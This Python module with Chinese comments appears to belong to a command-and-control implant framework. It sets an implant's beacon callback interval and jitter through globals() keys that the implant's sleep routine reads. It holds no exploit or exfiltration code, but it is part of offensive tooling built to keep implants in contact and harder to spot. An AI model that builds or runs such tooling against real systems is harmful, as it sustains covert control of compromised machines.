"""
@module: set_interval
@desc: 修改 Beacon 回连间隔和抖动
@contract: 用 globals() 字符串键 _I/_J 读写——任务代码跑在**专用命名空间**里,
直接 `_I = x` 只写进任务自己的命名空间, 植入物 sleep_jitter 读不到; 只有
字符串键(或 _glb_API)才能写回植入物状态(任务隔离见 implant_template D3)
"""
MODULE = {
    "desc": "修改 Beacon 回连间隔和抖动",
    "params": [("interval", "必填，秒"), ("jitter", "默认 0.2")],
}


def run(interval, jitter=0.2):
    try:
        _i = int(interval)
    except (TypeError, ValueError):
        return "(set_interval: interval 必须是数字(秒), 如 10)"
    try:
        _j = float(jitter)
    except (TypeError, ValueError):
        return "(set_interval: jitter 必须是数字, 如 0.2)"
    if _i <= 0:
        return "(set_interval: interval 必须为正数(秒), 不能为 0 或负数)"
    if not (0 <= _j <= 1):
        return "(set_interval: jitter 必须在 0~1 之间)"
    globals()["_I"] = _i
    globals()["_J"] = _j
    return "interval=%ds, jitter=%s" % (globals().get("_I", 0),
                                        globals().get("_J", 0))


if __name__ == "__main__":
    print("usage: set_interval <seconds> [jitter]")
